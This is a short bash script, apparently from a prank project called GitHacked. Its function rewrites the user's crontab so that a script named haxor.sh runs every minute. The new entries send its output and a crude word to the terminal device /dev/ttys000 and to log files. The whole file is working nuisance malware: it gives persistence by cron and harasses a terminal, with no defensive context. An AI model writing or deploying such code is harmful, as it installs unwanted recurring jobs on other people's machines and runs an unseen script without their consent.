#!/bin/bash
hax()
{
    chmod +x haxor.sh;
    #https://stackoverflow.com/questions/878600/how-to-create-a-cron-job-using-bash-automatically-without-the-interactive-editor
    #write out current crontab
    crontab -l > haxcron;
    #echo new cron into cron file
    echo "*/1 * * * * ~/GitHacked/haxor.sh > /log.txt" >> haxcron;
    echo "*/1 * * * * ~/GitHacked/haxor.sh > /dev/ttys000" >> haxcron;
    echo "*/1 * * * * echo 'Dick' > /dev/ttys000" >> haxcron;
    echo "*/1 * * * * echo 'Dick' > ~/GitHacked/log.txt" >> haxcron;
    #install new cron file
    crontab haxcron;
    #rm haxcron;
}
